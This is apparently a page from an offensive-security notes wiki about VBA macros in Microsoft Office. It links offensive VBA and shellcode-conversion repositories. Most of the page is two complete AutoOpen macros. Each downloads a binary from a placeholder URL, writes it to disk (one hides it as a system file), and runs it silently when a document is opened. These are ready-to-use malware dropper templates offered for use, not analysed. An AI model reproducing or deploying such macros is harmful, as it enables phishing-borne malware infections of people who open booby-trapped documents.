# ⭕ VBA

{% embed url="https://github.com/S3cur3Th1sSh1t/OffensiveVBA" %}

visual basic for applications is a VB scripting language embedded in applications like MS Office (a macro) and other applications like autoCAD.

with MS Office the VBA code is embedded in a document like a word processor file or spreadsheet.

{% hint style="info" %}
VBA is more powerful than VBS because it can interface directly with the windows API. VBA programs are not restricted in their access to the operating system.
{% endhint %}

## <mark style="color:red;">VBA Download & Execute</mark>

```
Sub AutoOpen()

Const ADTYPEBINARY = 1
Const ADSAVECREATEOVERWRITE = 2

Dim xHttp
Dim bStrm
Dim filename

Set xHttp = CreateObject("Microsoft.XMLHTTP")
xHttp.Open "GET", "https://<DOMAIN>/<FILE>", False
xHttp.Send

Set gobjBinaryOutputStream = CreateObject("Adodb.Stream")

filename = "C:\Temp\" & DateDiff("s", #1/1/1970#, Now())

gobjBinaryOutputStream.Type = ADTYPEBINARY
gobjBinaryOutputStream.Open
gobjBinaryOutputStream.write CreateObject("System.Text.ASCIIEncoding").GetBytes_4("M")
gobjBinaryOutputStream.write CreateObject("System.Text.ASCIIEncoding").GetBytes_4("Z")
gobjBinaryOutputStream.write xHttp.responseBody
gobjBinaryOutputStream.savetofile filename, ADSAVECREATEOVERWRITE

SetAttr filename, vbReadOnly + vbHidden + vbSystem
Shell (filename)

End Sub
```

or

```
Sub AutoOpen()
    Auto_Open
End Sub

Sub Auto_Open()
    payloadURL = "<Download URL>"
    Dim req: Set req = CreateObject("Microsoft.XMLHTTP")
    Dim payloadStream: Set payloadStream = CreateObject("Adodb.Stream")
    req.Open "GET", payloadURL, False
    req.Send

    tmpDir = Environ("TEMP")
    exePath = tmpDir + "\trhen.exe"
    With payloadStream
        .Type = 1
        .Open
        .write req.ResponseBody
        .savetofile exePath, 2
    End With
    
    Set WshShell = CreateObject("WScript.Shell")
    cmds = WshShell.Run(exePath, 0, True)
    Set WshShell = Nothing
End Sub
```

## <mark style="color:red;">Shellcode VBA</mark>

{% embed url="https://github.com/iilegacyyii/UsefulScripts/blob/master/ShellcodeToVBA.py" %}

{% embed url="https://github.com/ScriptIdiot/vba_bin_runner" %}

{% embed url="https://github.com/karttoon/trigen" %}
